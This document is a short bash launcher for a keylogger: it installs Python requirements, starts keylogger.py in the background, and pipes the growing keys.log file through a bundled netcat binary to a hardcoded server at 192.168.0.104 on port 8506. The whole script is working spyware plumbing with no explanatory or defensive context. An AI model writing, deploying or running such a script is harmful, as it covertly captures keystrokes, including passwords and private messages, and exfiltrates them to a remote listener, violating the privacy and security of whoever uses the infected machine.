#!/bin/bash
SERVER_IP="192.168.0.104"
PORT=8506

pip3 install -r requirements.txt > /dev/null
python3 keylogger.py &

chmod +x netcat
sleep 0.5
touch keys.log
tail -f keys.log | ./netcat $SERVER_IP $PORT &


